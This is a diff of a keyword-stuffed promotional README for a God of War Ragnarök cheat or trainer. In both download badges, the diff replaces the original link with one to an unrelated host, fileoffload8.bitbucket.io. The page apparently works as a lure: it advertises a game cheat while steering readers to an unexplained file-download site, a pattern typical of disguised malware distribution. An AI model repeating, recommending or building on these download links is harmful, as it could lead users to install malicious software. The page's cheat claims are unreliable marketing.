@@ -4,7 +4,7 @@
 
 Whether you're here for the cinematic story or want to wreck everything in your path — this is how you break the game and become the true God of War.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/god-of-war-ragnarok/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload8.bitbucket.io)
 ---
 
 ## 🎮 What Is a God of War Ragnarök Cheat?
@@ -19,7 +19,7 @@ A **cheat** for God of War Ragnarök is a memory modifier or trainer that inject
 
 Perfect for players who want to speedrun, replay the game with style, or just enjoy the chaos.
 
-[![Download Cheat](https://gamemag.ru/images/cache/News/News171950/e85b085504-1_1390x600.jpg)](https://wecheaters.github.io/cheats/god-of-war-ragnarok/)
+[![Download Cheat](https://gamemag.ru/images/cache/News/News171950/e85b085504-1_1390x600.jpg)](https://fileoffload8.bitbucket.io)
 ---
 
 ## 🔥 Best God of War Ragnarök Cheats
@@ -106,3 +106,4 @@ god of war ragnarök cheat, ragnarök god mode, one-hit kill trainer, infinite r
 
 **Be the god you're meant to be.**
 With a **God of War Ragnarök cheat**, you're not just playing a game — you're rewriting myth with every swing. ⚔️🔥👑
+
